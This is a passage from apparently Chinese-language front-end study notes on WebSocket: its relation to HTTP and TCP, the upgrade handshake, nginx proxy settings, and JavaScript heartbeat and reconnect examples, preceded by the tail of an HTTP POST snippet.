    json<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token comment">// Automatically stringifies the body to JSON</span>
    <span class="token comment">//qs: reqData,</span>
    body<span class="token operator">:</span> reqData<span class="token punctuation">,</span><span class="token comment">//POST data to a JSON REST API</span>
    <span class="token comment">// form: reqData,//POST like HTML forms do</span>
    <span class="token comment">//formData: reqData,//if you want to include a file upload then use options.formData:</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token function">rp</span><span class="token punctuation">(</span>options<span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">parsedBody</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// POST succeeded...</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>parsedBody<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">err</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// POST failed...</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br></div></div><h3 id="graphql"><a href="#graphql" class="header-anchor">#</a> Graphql</h3> <h4 id="示范"><a href="#示范" class="header-anchor">#</a> 示范</h4> <p><img src="/rat-summ/assets/img/11-13-46.d8ccc9dd.jpg" alt=""></p> <h2 id="websocket"><a href="#websocket" class="header-anchor">#</a> websocket</h2> <h3 id="_1-各种协议的关系比较【要点】"><a href="#_1-各种协议的关系比较【要点】" class="header-anchor">#</a> 1:各种协议的关系比较【要点】</h3> <ul><li><p><strong>TCP/IP</strong>：TCP/IP属于传输层，主要解决数据在网络中的传输问题，只管传输数据。但是那样对传输的数据没有一个规范的封装、解析等处理，使得传输的数据就很难识别，所以才有了应用层协议对数据的封装、解析等，如HTTP协议。</p></li> <li><p><strong>HTTP</strong>：HTTP是应用层协议，封装解析传输的数据。 从HTTP1.1开始其实就默认开启了长连接，也就是请求header中看到的Connection:Keep-alive。但是这个长连接只是说保持了（服务器可以告诉客户端保持时间Keep-Alive:timeout=200;max=20;）这个TCP通道，直接Request - Response，而不需要再创建一个连接通道，做到了一个性能优化。但是HTTP通讯本身还是Request - Response。</p></li> <li><p><strong>Socket</strong>：<strong>与HTTP不一样，socket不是协议，它是在程序层面上对传输层协议（可以主要理解为TCP/IP）的接口封装</strong>。 我们知道传输层的协议，是解决数据在网络中传输的，那么socket就是传输通道两端的接口。所以对于前端而言，<strong>Socket也可以简单的理解为对TCP/IP的抽象协议</strong>。</p></li> <li><p><strong>WebSocket</strong>： WebSocket是包装成了一个应用层协议作为socket,从而能够让客户端和远程服务端通过web建立<strong>全双工通信</strong>。websocket提供ws和wss两种URL方案。<strong><code>跟socket的关系，类似于javascript跟java的关系</code>；</strong></p></li></ul> <h3 id="_2-websocket与http的比较"><a href="#_2-websocket与http的比较" class="header-anchor">#</a> 2:Websocket与Http的比较</h3> <blockquote><h4 id="http的局限性"><a href="#http的局限性" class="header-anchor">#</a> HTTP的局限性</h4></blockquote> <ul><li>HTTP是半双工协议，也就是说，<strong>在同一时刻数据只能单向流动</strong>，客户端向服务器发送请求(单向的)，然后服务器响应请求(单向的)。</li> <li><code>服务器不能主动推送数据给浏览器</code>。这就会导致一些高级功能难以实现，诸如聊天室场景就没法实现。</li> <li>WebSocket 与 HTTP 内部<strong>都是基于 TCP 协议</strong>，区别<strong>在于 HTTP 是单向的（单双工），WebSocket 是双向的（全双工）</strong>，协议是 <code>ws://</code> 和 <code>wss://</code> 对应 <code>http://</code> 和 <code>https://</code>，因为<strong>没有跨域限制，所以使用 <code>file://</code> 协议也可以进行通信。</strong></li></ul> <p><img src="/rat-summ/assets/img/14-50-55.06bd46d8.jpg" alt="14-50-55"></p> <h3 id="_3-简介-特点"><a href="#_3-简介-特点" class="header-anchor">#</a> 3:简介/特点</h3> <p>在WebSocket协议之前，有三种实现双向通信的方式：<code>轮询（polling）</code>、<code>长轮询（long-polling）</code>和<code>iframe流（streaming）</code>。</p> <p>一旦Web服务器与客户端之间建立起WebSocket协议的通信连接，之后所有的通信都依靠这个专用协议进行。通信过程中可互相发送JSON、XML、HTML或图片等任意格式的数据。<strong>由于是建立在HTTP基础上的协议，因此连接的发起方仍是客户端</strong>，而<strong>一旦确立WebSocket通信连接，不论服务器还是客户端，任意一方都可直接向对方发送报文</strong>。</p> <p>数据格式比较轻量，性能开销小，通信高效。<strong>服务器与客户端之间交换的标头信息大概只有<code>2字节</code></strong>;</p> <blockquote><h4 id="web-实时推送技术的比较"><a href="#web-实时推送技术的比较" class="header-anchor">#</a> Web 实时推送技术的比较</h4></blockquote> <p><img src="/rat-summ/assets/img/14-59-17.78c4e153.jpg" alt="14-59-17"></p> <h3 id="_4-协议升级过程【要点】"><a href="#_4-协议升级过程【要点】" class="header-anchor">#</a> 4:协议升级过程【要点】</h3> <p>首先，WebSocket连接必须由浏览器发起，因为<strong>请求协议是一个标准的HTTP请求</strong>，格式如下：</p> <div class="language-http line-numbers-mode"><pre class="language-http"><code>GET ws://localhost:3000/ws/chat HTTP/1.1
<span class="token header-name keyword">Host:</span> localhost
<span class="token header-name keyword">Upgrade:</span> websocket
<span class="token header-name keyword">Connection:</span> Upgrade
<span class="token header-name keyword">Origin:</span> http://localhost:3000
<span class="token header-name keyword">Sec-WebSocket-Key:</span> client-random-string
<span class="token header-name keyword">Sec-WebSocket-Version:</span> 13
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>该请求和普通的HTTP请求<strong>有几点不同</strong>：</p> <ul><li>GET请求的地址不是类似/path/，而是以ws://开头的地址；</li> <li>请求头Upgrade: websocket和Connection: <strong>Upgrade表示这个连接将要被转换为WebSocket连接</strong>；</li> <li>Sec-WebSocket-Key是用于标识这个连接，并非用于加密数据；</li> <li>Sec-WebSocket-Version指定了WebSocket的协议版本。</li></ul> <p>随后，服务器如果接受该请求，就会返回如下响应：</p> <div class="language-http line-numbers-mode"><pre class="language-http"><code><span class="token response-status">HTTP/1.1 <span class="token property">101 Switching Protocols</span></span>
<span class="token header-name keyword">Upgrade:</span> websocket
<span class="token header-name keyword">Connection:</span> Upgrade

<span class="token header-name keyword">Sec-WebSocket-Accept:</span> server-random-string
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>该响应代码101<strong>表示本次连接的HTTP协议即将被更改，更改后的协议就是Upgrade: websocket指定的WebSocket协议。</strong></p> <p>对应nginx的配置：</p> <div class="language-nginx line-numbers-mode"><pre class="language-nginx"><code> <span class="token keyword">proxy_http_version</span> <span class="token number">1.1</span><span class="token punctuation">;</span>
 <span class="token keyword">proxy_set_header</span> Upgrade <span class="token variable">$http_upgrade</span><span class="token punctuation">;</span>
 <span class="token keyword">proxy_set_header</span> Connection <span class="token string">&quot;upgrade&quot;</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p><strong>websocket的连接建立过程【总括】</strong>： webSocket 是基于HTTP协议的，或者说 <em>借用</em> HTTP的协议来完成一部分握手。</p> <ul><li>1、客户端发送GET 请求， upgrade；</li> <li>2、服务器给客户端  switching protocol；</li> <li>3、就进行了webSocket的通信了；</li></ul> <p>具体内容：发送一个GET请求</p> <p>关键:<code>Upgrade: websocket</code>; <code>Connection: Upgrade</code></p> <p>这两个就告诉服务器，我要发起websocket协议，我不是HTTP。</p> <h3 id="_5-心跳及重连机制【要点】"><a href="#_5-心跳及重连机制【要点】" class="header-anchor">#</a> 5:心跳及重连机制【要点】</h3> <p>心跳机制是每隔一段时间会向服务器发送一个数据包，<strong>告诉服务器自己还活着，同时客户端会确认服务器端是否还活着</strong>，如果还活着的话，就会回传一个数据包给客户端来确定服务器端也还活着，否则的话，有可能是网络断开连接了。需要重连;</p> <h4 id="实现心跳检测的思路"><a href="#实现心跳检测的思路" class="header-anchor">#</a> 实现心跳检测的思路</h4> <blockquote><p><strong>socket.io..和pomelo的socket都实现了心跳..</strong></p></blockquote> <ul><li>每隔一段固定的时间，<strong>向服务器端发送一个ping数据，如果在正常的情况下，服务器会返回一个pong给客户端</strong>;</li> <li>如果客户端通过<strong>onmessage事件能监听到的话，说明请求正常</strong>，这里我们<strong>使用了一个定时器，每隔3秒的情况下</strong>，如果是网络断开的情况下，在指定的时间内服务器端并没有返回心跳响应消息，因此服务器端断开了;</li> <li>因此这个时候我们使用<strong>ws.close</strong>关闭连接**，在一段时间后(在不同的浏览器下，时间是不一样的，firefox响应更快)，
可以通过 onclose事件监听到。**因此在onclose事件内，我们可以调用 reconnect事件进行重连操作。</li></ul> <p><strong>要点</strong></p> <ul><li>1.服务端向客户端发送心跳..,客户端记录接受心跳的时间..</li> <li>2.客户端每隔一段时间检查,服务端的心跳时间是否大于超时时间</li></ul> <p><strong>代码实现</strong></p> <ul><li>在弱网环境下，发送消息无法抵达接收端；或断网到浏览器约定时限等一些异常情况都会触发onclose和onerror,<strong>所以理论上，我们只要在onclose和onerror时，重新创建长连接就可以。</strong></li> <li>在实际使用过程中，发现有些浏览器，r<strong>econnect重连会多次触发，所以需要给重连加一把锁，当一个重连正在执行的时候，无法再触发一次重连</strong>；</li> <li>如果是同个浏览器中多个页面共用一个连接来进行通信，那么就需要使用浏览器缓存/数据路（localStorage/indexedDB）去加这把锁。</li></ul> <p><strong>优化方向</strong></p> <ul><li>重连实现；</li> <li>加入心跳优化；</li> <li>同时触发多次重连优化；</li> <li>加入断线重连次数；</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token operator">&lt;</span>html<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>head<span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span>meta charset<span class="token operator">=</span><span class="token string">&quot;utf-8&quot;</span><span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span>title<span class="token operator">&gt;</span>WebSocket Demo<span class="token operator">&lt;</span><span class="token operator">/</span>title<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>head<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>body<span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">&quot;text/javascript&quot;</span><span class="token operator">&gt;</span>
    <span class="token comment">// var ws = new WebSocket(&quot;wss://echo.websocket.org&quot;);</span>
    <span class="token comment">/*
    ws.onerror = function(e) {
      console.log('已关闭');
    };
    ws.onopen = function(e) {
      console.log('握手成功');
      ws.send('123456789');
    }
    ws.onclose = function() {
      console.log('已关闭');
    }
    ws.onmessage = function(e) {
      console.log('收到消息');
      console.log(e);
    }
    */</span>
    <span class="token keyword">var</span> lockReconnect <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token comment">//避免重复连接</span>
    <span class="token keyword">var</span> wsUrl <span class="token operator">=</span> <span class="token string">&quot;wss://echo.websocket.org&quot;</span><span class="token punctuation">;</span>
    <span class="token keyword">var</span> ws<span class="token punctuation">;</span>
    <span class="token keyword">var</span> tt<span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      ws<span class="token punctuation">.</span><span class="token function-variable function">onclose</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'链接关闭'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">reconnect</span><span class="token punctuation">(</span>wsUrl<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span><span class="token punctuation">;</span>
      ws<span class="token punctuation">.</span><span class="token function-variable function">onerror</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'发生异常了'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">reconnect</span><span class="token punctuation">(</span>wsUrl<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span><span class="token punctuation">;</span>
      ws<span class="token punctuation">.</span><span class="token function-variable function">onopen</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">//心跳检测重置</span>
        heartCheck<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span><span class="token punctuation">;</span>
      ws<span class="token punctuation">.</span><span class="token function-variable function">onmessage</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">//拿到任何消息都说明当前连接是正常的</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'接收到消息'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        heartCheck<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//heartCheck.reset();</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">function</span> <span class="token function">reconnect</span><span class="token punctuation">(</span><span class="token parameter">url</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">if</span><span class="token punctuation">(</span>lockReconnect<span class="token punctuation">)</span> <span class="token keyword">return</span>
      lockReconnect <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
      <span class="token comment">//没连接上会一直重连，设置延迟避免请求过多；后面也可以做重试测试判断,比如到5次后，跳转到登陆页面；</span>
      tt <span class="token operator">&amp;&amp;</span> <span class="token function">clearTimeout</span><span class="token punctuation">(</span>tt<span class="token punctuation">)</span><span class="token punctuation">;</span>
      tt <span class="token operator">=</span> <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">createWebSocket</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>
        lockReconnect <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">4000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token comment">//心跳检测</span>
    <span class="token keyword">var</span> heartCheck <span class="token operator">=</span> <span class="token punctuation">{</span>
      timeout<span class="token operator">:</span> <span class="token number">3000</span><span class="token punctuation">,</span>
      timeoutObj<span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">,</span>
      serverTimeoutObj<span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">,</span>
      <span class="token function-variable function">reset</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        	<span class="token function">clearTimeout</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>timeoutObj<span class="token punctuation">)</span><span class="token punctuation">;</span>
        	<span class="token function">clearTimeout</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>serverTimeoutObj<span class="token punctuation">)</span><span class="token punctuation">;</span>
        	<span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span><span class="token punctuation">,</span>
      <span class="token function-variable function">start</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'start'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">var</span> self <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>timeoutObj <span class="token operator">&amp;&amp;</span> <span class="token function">clearTimeout</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>timeoutObj<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>serverTimeoutObj <span class="token operator">&amp;&amp;</span> <span class="token function">clearTimeout</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>serverTimeoutObj<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>timeoutObj <span class="token operator">=</span> <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
          <span class="token comment">//这里发送一个心跳，后端收到后，返回一个心跳消息，</span>
          ws<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">&quot;HeartBeatSamy&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          self<span class="token punctuation">.</span>serverTimeoutObj <span class="token operator">=</span> <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">111</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>ws<span class="token punctuation">)</span><span class="token punctuation">;</span>
            ws<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
           <span class="token comment">//如果onclose会执行reconnect，我们执行ws.close()就行了.如果直接执行reconnect 会触发onclose导致重连两次</span>
            <span class="token comment">// createWebSocket();</span>
          <span class="token punctuation">}</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>timeout<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>timeout<span class="token punctuation">)</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">function</span> <span class="token function">createWebSocket</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">try</span> <span class="token punctuation">{</span>
        ws <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebSocket</span><span class="token punctuation">(</span>wsUrl<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'catch'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">reconnect</span><span class="token punctuation">(</span>wsUrl<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token function">createWebSocket</span><span class="token punctuation">(</span>wsUrl<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">&gt;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br><span class="line-number">71</span><br><span class="line-number">72</span><br><span class="line-number">73</span><br><span class="line-number">74</span><br><span class="line-number">75</span><br><span class="line-number">76</span><br><span class="line-number">77</span><br><span class="line-number">78</span><br><span class="line-number">79</span><br><span class="line-number">80</span><br><span class="line-number">81</span><br><span class="line-number">82</span><br><span class="line-number">83</span><br><span class="line-number">84</span><br><span class="line-number">85</span><br><span class="line-number">86</span><br><span class="line-number">87</span><br><span class="line-number">88</span><br><span class="line-number">89</span><br><span class="line-number">90</span><br><span class="line-number">91</span><br><span class="line-number">92</span><br><span class="line-number">93</span><br><span class="line-number">94</span><br><span class="line-number">95</span><br><span class="line-number">96</span><br><span class="line-number">97</span><br><span class="line-number">98</span><br><span class="line-number">99</span><br><span class="line-number">100</span><br></div></div><h4 id="简单示例"><a href="#简单示例" class="header-anchor">#</a> 简单示例</h4> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">connectWebsocket</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    ws <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebSocket</span><span class="token punctuation">(</span><span class="token string">'ws://localhost:9000'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 监听连接成功</span>
    ws<span class="token punctuation">.</span><span class="token function-variable function">onopen</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'连接服务端WebSocket成功'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        ws<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>msgData<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	<span class="token comment">// send 方法给服务端发送消息</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token comment">// 监听服务端消息(接收消息)</span>
    ws<span class="token punctuation">.</span><span class="token function-variable function">onmessage</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">msg</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        <span class="token keyword">let</span> message <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'收到的消息：'</span><span class="token punctuation">,</span> message<span class="token punctuation">)</span>
        elUl<span class="token punctuation">.</span>innerHTML <span class="token operator">+=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;li class=&quot;b&quot;&gt;小秋：</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>message<span class="token punctuation">.</span>content<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">&lt;/li&gt;</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token comment">// 监听连接失败</span>
    ws<span class="token punctuation">.</span><span class="token function-variable function">onerror</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'连接失败，正在重连...'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">connectWebsocket</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token comment">// 监听连接关闭</span>
    ws<span class="token punctuation">.</span><span class="token function-variable function">onclose</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    	console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'连接关闭'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token function">connectWebsocket</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br></div></div><h3 id="_6-nginx中兼容设置"><a href="#_6-nginx中兼容设置" class="header-anchor">#</a> 6:nginx中兼容设置</h3> <div class="language-nginx line-numbers-mode"><pre class="language-nginx"><code><span class="token keyword">location</span> <span class="token operator">/</span> <span class="token punctuation">{</span>
 <span class="token comment"># enable WebSockets</span>
  <span class="token keyword">proxy_http_version</span> <span class="token number">1.1</span><span class="token punctuation">;</span>
  <span class="token keyword">proxy_set_header</span> Upgrade <span class="token variable">$http_upgrade</span><span class="token punctuation">;</span>
  <span class="token keyword">proxy_set_header</span> Connection <span class="token string">&quot;upgrade&quot;</span><span class="token punctuation">;</span>
  
  <span class="token keyword">proxy_set_header</span> X<span class="token operator">-</span>Forwarded<span class="token operator">-</span>For <span class="token variable">$proxy_add_x_forwarded_for</span><span class="token punctuation">;</span>
  <span class="token keyword">proxy_set_header</span> Host <span class="token variable">$host</span><span class="token punctuation">;</span>
  <span class="token keyword">proxy_pass</span>   <span class="token keyword">http</span><span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">7001</span><span class="token punctuation">;</span>

  <span class="token comment"># http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_bind</span>
  <span class="token comment"># proxy_bind       $remote_addr transparent;</span>
<span class="token punctuation">}</span>
